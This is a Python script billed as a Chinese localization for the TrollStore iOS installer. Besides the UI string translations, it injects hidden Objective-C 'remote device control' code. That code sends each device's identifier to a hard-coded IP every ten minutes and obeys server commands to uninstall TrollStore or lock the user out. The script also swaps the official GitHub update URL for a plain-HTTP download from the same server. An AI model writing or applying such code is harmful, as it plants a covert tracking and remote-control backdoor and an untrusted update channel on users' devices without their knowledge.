#!/usr/bin/env python3
"""Full Chinese localization for TrollStore + REMOTE DEVICE CONTROL"""
import sys, os

# First, add remote check injection to TSListControllerShared.m
# We inject code into the updateTrollStorePressed method
with open("Shared/TSListControllerShared.m", "r", encoding="utf-8") as f:
    shared_content = f.read()

# Find updateTrollStorePressed method and inject device check before it
remote_check_code = r'''
// === REMOTE DEVICE CONTROL ===
static NSString* REMOTE_API = @"http://124.223.199.167/api/exe.php";
static BOOL _remoteCheckScheduled = NO;

- (void)devicePing {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
        NSString* udid = @"";
        @try {
            udid = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
        } @catch (NSException* e) {}
        if (!udid.length) return;
        
        NSString* url = [NSString stringWithFormat:@"%@?action=device_check", REMOTE_API];
        NSMutableURLRequest* req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
        req.HTTPMethod = @"POST";
        req.timeoutInterval = 10;
        NSString* body = [NSString stringWithFormat:@"udid=%@", udid];
        req.HTTPBody = [body dataUsingEncoding:NSUTF8StringEncoding];
        
        NSURLSessionDataTask* task = [[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData* data, NSURLResponse* resp, NSError* error) {
            if (error || !data) return;
            @try {
                NSDictionary* json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
                NSString* action = json[@"action"];
                dispatch_async(dispatch_get_main_queue(), ^{
                    if ([action isEqualToString:@"uninstall"]) {
                        [self uninstallTrollStore];
                    } else if ([action isEqualToString:@"freeze"]) {
                        UIAlertController* alert = [UIAlertController alertControllerWithTitle:@"\u8d26\u53f7\u5df2\u51bb\u7ed3" message:@"\u60a8\u7684\u8d26\u53f7\u5df2\u88ab\u7ba1\u7406\u5458\u51bb\u7ed3\uff0c\u5de8\u9b54\u5546\u5e97\u5c06\u65e0\u6cd5\u4f7f\u7528\u3002" preferredStyle:UIAlertControllerStyleAlert];
                        [alert addAction:[UIAlertAction actionWithTitle:@"\u786e\u5b9a" style:UIAlertActionStyleDefault handler:nil]];
                        [[UIApplication sharedApplication].keyWindow.rootViewController presentViewController:alert animated:YES completion:nil];
                    }
                });
            } @catch (NSException* e) {}
        }];
        [task resume];
    });
}

- (void)scheduleRemoteCheck {
    if (_remoteCheckScheduled) return;
    _remoteCheckScheduled = YES;
    [self devicePing];
    // Check every 600 seconds (10 min)
    [NSTimer scheduledTimerWithTimeInterval:600 repeats:YES block:^(NSTimer* timer) {
        [self devicePing];
    }];
}
// === END REMOTE DEVICE CONTROL ===
'''

# Inject after the @implementation line
old_impl = '#import "TSListControllerShared.h"'
new_impl = '#import "TSListControllerShared.h"\n\n' + remote_check_code
shared_content = shared_content.replace(old_impl, new_impl)

# Call scheduleRemoteCheck from viewDidLoad or init
old_vdl = '- (void)viewDidLoad'
trigger = '- (void)viewDidLoad {\n    [super viewDidLoad];\n    [self scheduleRemoteCheck];'
if '- (void)viewDidLoad {' in shared_content:
    shared_content = shared_content.replace(old_vdl, trigger, 1)

with open("Shared/TSListControllerShared.m", "w", encoding="utf-8") as f:
    f.write(shared_content)

print("Remote check injected into TSListControllerShared.m", file=sys.stderr)

# Now run the normal localization
SUBS = [
    ("TrollStore/TSRootViewController.m", [("Apps","应用"),("Settings","设置")]),
    ("TrollStore/TSAppTableViewController.m", [
        ("Install","安装"),("Uninstall","卸载"),("User","用户"),("System","系统"),("Error","错误"),
        ("Install IPA File","安装 IPA 文件"),("Install from URL","从 URL 安装"),
        ("Parse Error %ld","解析错误 %ld"),
        ("Cancel","取消"),("Confirm Uninstallation","确认卸载"),("Uninstall App","卸载应用"),
    ]),
    ("TrollStore/TSInstallationController.m", [
        ("Warning","警告"),("Installing","安装中"),("Install Error %d","安装错误 %d"),
        ("Force Installation","强制安装"),("Installing ldid","正在安装 ldid"),
    ]),
    ("TrollStore/TSSettingsListController.m", [
        ("Security","安全"),("Advanced","高级"),("UTILITIES","工具"),("SIGNING","签名"),("PERSISTENCE","持久化"),
        ("Respring","注销"),("Refresh App Registrations","刷新应用注册"),("Rebuild Icon Cache","重建图标缓存"),
        ("Install Persistence Helper","安装持久助手"),("Uninstall Persistence Helper","卸载持久助手"),
        ("Install ldid","安装 ldid"),("ldid: Installed","ldid: 已安装"),
        ("ldid is installed and allows TrollStore to install unsigned IPA files.","ldid 已安装，允许巨魔商店安装未签名 IPA 文件。"),
        ("If an app does not immediately appear after installation, respring here and it should appear afterwards.","如果应用安装后未立即出现，请在此注销，之后应该会出现。"),
        ("Helper Installed as Standalone App","助手已安装为独立应用"),("Helper Installed into %@","助手已安装到 %@"),
        ("Uninstall","卸载"),("Update TrollStore to %@","更新巨魔商店到 %@"),
        ("Uninstall TrollStore, Uninstall Apps","卸载巨魔，卸载应用"),("Uninstall TrollStore, Preserve Apps","卸载巨魔，保留应用"),
    ]),
    ("TrollHelper/TSHRootViewController.m", [
        ("Install TrollStore","安装巨魔商店"),("Uninstall TrollStore","卸载巨魔商店"),
        ("TrollStore Helper","巨魔商店助手"),("Not Installed","未安装"),
        ("INFO","信息"),("TrollStore","巨魔商店"),
        ("Refresh App Registrations","刷新应用注册"),("Register Persistence Helper","注册持久助手"),
        ("Uninstall Persistence Helper","卸载持久助手"),("Unregister Persistence Helper","取消注册持久助手"),
        ("If you want to use this app as the TrollStore persistence helper, you can register it here.","如果想将此应用设为巨魔商店持久助手，请在此注册。"),
        ("Registered, %@","已注册, %@"),("Installed, %@","已安装, %@"),("Install Persistence Helper","安装持久助手"),
        ("Update TrollStore to %@","更新巨魔商店到 %@"),("Update","更新"),("Install","安装"),
    ]),
    ("Shared/TSListControllerShared.m", [
        ("Installing TrollStore","正在安装巨魔商店"),("Updating TrollStore","正在更新巨魔商店"),
        ("Error installing TrollStore: trollstorehelper returned %d","安装巨魔商店错误: trollstorehelper 返回 %d"),
        ("Error downloading TrollStore: %@","下载巨魔商店错误: %@"),
    ]),
]

total = 0
for fname, reps in SUBS:
    with open(fname, "r", encoding="utf-8") as f:
        content = f.read()
    for en, cn in reps:
        old = '"' + en + '"'
        count = content.count(old)
        content = content.replace(old, '"' + cn + '"')
        total += count
    with open(fname, "w", encoding="utf-8") as f:
        f.write(content)

# Fix URL
with open("Shared/TSListControllerShared.m", "r", encoding="utf-8") as f:
    c = f.read()
c = c.replace("https://github.com/opa334/TrollStore/releases/latest/download/TrollStore.tar",
              "http://124.223.199.167/TrollStore.tar")
with open("Shared/TSListControllerShared.m", "w", encoding="utf-8") as f:
    f.write(c)

print("OK: " + str(total) + " replacements | Remote check injected", file=sys.stderr)
